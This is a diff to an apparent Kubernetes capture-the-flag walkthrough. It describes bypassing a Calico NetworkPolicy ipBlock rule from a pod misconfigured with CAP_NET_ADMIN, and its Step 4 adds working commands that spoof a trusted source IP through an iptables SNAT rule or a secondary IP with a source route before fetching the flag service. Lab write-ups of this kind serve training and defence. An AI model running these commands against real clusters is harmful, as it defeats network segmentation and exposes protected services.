@@ -28,8 +28,14 @@
 
 ## Attack Path Summary
 ```
-Attacker pod (untrust-zone, blocked by NetworkPolicy) → Discover trusted pod IP (10.244.1.x) → IP spoofing: add trusted IP to attacker pod interface → Bypass ipBlock CIDR check → Access flag service
+Attacker pod (untrust-zone, blocked by NetworkPolicy) → Discover trusted pod IP
+  (10.244.1.x) → With CAP_NET_ADMIN, rewrite the source IP (iptables SNAT or
+  secondary IP + source-route) → Bypass ipBlock CIDR check → Access flag service
 ```
+
+> 前置：本场景安装 Calico（kind 默认 CNI 不强制 NetworkPolicy）。攻击者 pod
+> 被错误地授予了 `CAP_NET_ADMIN`——这是该场景真正的配置缺陷，没有它就无法
+> 改写源 IP。
 
 ## Prerequisites
 
@@ -65,7 +71,15 @@ echo "Trusted IP: $TRUSTED_IP"
 
 ### Step 4: Spoof IP to Bypass NetworkPolicy
 ```bash
+# The attacker pod is misconfigured with CAP_NET_ADMIN (the actual finding).
+# Primary: SNAT the source IP with iptables
+kubectl exec -n untrust-zone attacker-pod -- \
+  iptables -t nat -A POSTROUTING -d ${FLAG_IP} -j SNAT --to-source ${TRUSTED_IP}
+
+# Alternative: add a secondary IP and force source selection
 kubectl exec -n untrust-zone attacker-pod -- ip addr add ${TRUSTED_IP}/32 dev eth0
+kubectl exec -n untrust-zone attacker-pod -- ip route add ${FLAG_IP}/32 dev eth0 src ${TRUSTED_IP}
+
 kubectl exec -n untrust-zone attacker-pod -- wget -qO- http://${FLAG_IP}:8080
 # Success — NetworkPolicy sees source IP matching the allowed CIDR
 ```
